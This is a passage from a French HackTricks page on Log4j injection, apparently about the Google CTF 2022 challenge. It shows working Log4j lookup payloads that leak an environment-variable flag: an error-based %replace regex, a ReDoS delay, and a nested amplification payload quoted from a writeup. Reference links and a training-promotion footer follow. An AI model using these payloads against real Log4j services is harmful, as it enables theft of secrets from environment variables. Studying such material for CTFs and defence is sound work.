%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Bas√© sur le temps**

Comme mentionn√© dans la section pr√©c√©dente, **`%replace`** prend en charge **les regex**. Il est donc possible d'utiliser un payload de la [**page ReDoS**](../regular-expression-denial-of-service-redos.md) pour provoquer un **d√©lai** si le drapeau est trouv√©.\
Par exemple, un payload comme `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` d√©clencherait un **d√©lai** dans ce CTF.

Dans ce [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), au lieu d'utiliser une attaque ReDoS, il a utilis√© une **attaque d'amplification** pour provoquer une diff√©rence de temps dans la r√©ponse :

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Si le drapeau commence par `flagGuess`, l'ensemble du drapeau est remplac√© par 29 `#`-s (j'ai utilis√© ce caract√®re car il ne ferait probablement pas partie du drapeau). **Chacun des 29 `#`-s r√©sultants est ensuite remplac√© par 54 `#`-s**. Ce processus est r√©p√©t√© **6 fois**, ce qui donne un total de ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-s!**
>
> Remplacer autant de `#`-s d√©clenchera le d√©lai de 10 secondes de l'application Flask, ce qui entra√Ænera l'envoi du code d'√©tat HTTP 500 √† l'utilisateur. (Si le drapeau ne commence pas par `flagGuess`, nous recevrons un code d'√©tat non-500)

## R√©f√©rences

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
